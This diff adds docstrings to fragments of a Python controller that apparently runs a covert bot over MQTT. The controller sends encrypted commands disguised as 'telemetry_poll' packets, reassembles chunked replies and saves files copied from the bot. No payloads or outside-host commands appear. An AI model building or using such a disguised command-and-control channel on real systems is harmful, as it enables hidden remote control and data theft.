@@ -14,6 +14,8 @@ DEBUG_PRINT = False
 TIMEOUT_DURATION = 90  # seconds
 
 def on_message(client, userdata, msg):
+    """Handles incoming MQTT messages from the bot."""
+
     try:
         packet = json.loads(msg.payload.decode())
         if packet.get("s_id") != BOT_ID:
@@ -45,6 +47,7 @@ def on_message(client, userdata, msg):
 
 
 def save_file_from_message(raw_res):
+    """Saves a base64-encoded file sent from the bot."""
     try:
         _, filename, b64data = raw_res.split(":", 2)
         with open(f"copied_{filename}", "wb") as f:
@@ -55,6 +58,7 @@ def save_file_from_message(raw_res):
 
 
 def create_controller_packet(encrypted_b64_payload):
+    """Creates a JSON packet to send to the bot."""
     packet = {
         "s_id": CONTROLLER_ID,
         "type": "telemetry_poll",
@@ -64,6 +68,7 @@ def create_controller_packet(encrypted_b64_payload):
 
 
 def get_msg_from_chunks(raw_res):
+    """Handles chunked messages from the bot."""
     try:
         # Split: CHK : current : total : data
         parts = raw_res.split(":", 3)
@@ -95,11 +100,13 @@ def get_msg_from_chunks(raw_res):
 
 
 def timeout_message():
+    """Waits for a response or times out."""
     if not response_event.wait(timeout=TIMEOUT_DURATION):
         log(f"[TIMEOUT]: No response for {test}")
 
 
 def debug_send_print():
+    """Prints debug information about the sent packet."""
     print("----")
     print(f"[DEBUG]: showcase of the hidden packet being sent:")
     print(json.dumps(packet, indent=4))
